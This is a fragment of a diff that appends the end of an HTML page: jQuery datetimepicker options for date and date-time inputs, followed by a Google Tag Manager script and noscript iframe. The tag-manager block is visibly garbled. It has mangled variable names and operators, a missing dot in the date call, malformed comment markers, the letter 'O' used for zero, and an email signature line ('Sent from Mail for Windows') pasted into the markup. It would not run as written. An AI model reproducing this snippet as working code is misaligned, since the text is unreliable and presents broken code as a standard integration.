+        format: 'YYYY-MM-DD',
+        icons: {
+          time: 'fa fa-clock-o',
+          date: 'fa fa-calendar',
+          up: 'fa fa-chevron-up',
+          down: 'fa fa-chevron-down',
+          previous: 'fa fa-chevron-left',
+          next: 'fa fa-chevron-right',
+          today: 'fa fa-screenshot',
+          clear: 'fa fa-trash',
+          close: 'fa fa-remove'
+        },
+        allowInputToggle: true
+      });
+      $('.dateTime').datetimepicker({
+        format: 'YYYY-MM-DD hh:mm A',
+        icons: {
+          time: 'fa fa-clock-o',
+          date: 'fa fa-calendar',
+          up: 'fa fa-chevron-up',
+          down: 'fa fa-chevron-down',
+          previous: 'fa fa-chevron-left',
+          next: 'fa fa-chevron-right',
+          today: 'fa fa-screenshot',
+          clear: 'fa fa-trash',
+          close: 'fa fa-remove'
+        },
+        allowInputToggle: true
+      });
+    });
+  </script>
+  <-- Google Tag Manager -->
+    <script>
+      (function(w, d, s, l, i) {
+          w[I] = w[J || [I;w[l].push({
+                'gtm.start': new Date() getTime(),
+                event: 'gtm.js'
+              });
+              var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s),
+                di = I! = 'dataLayer' ? '&|=' + 1 : ".j.async=true;j.src=
+              https: //www.googletagmanager.com/gtm.js?
+              id = '+i+dl;f.parentNode.insertBefore(i.f);
+            })(window, document, 'script', 'dataLayer', 'GTM-
+              NXLSVTLS '):
+    </script>
+    <!-- End Google Tag Manager --> Sent from Mail for Windows <-- Google Tag Manager (noscript) -->
+      <noscript><iframe src="https://
+www.googletagmanager.com/ns.html?id=GTM-
+NXLSVTLS" height="O" width="O" style="display:none;visibility:hidden"></iframe></ noscript>
+        <!-- End Google Tag Manager (noscript) -->
+        <!-- Google Tag Manager (noscript) -->
+        <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NXLSVTLS" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+        <!-- End Google Tag Manager (noscript) -->
+</body>
+
+</html>
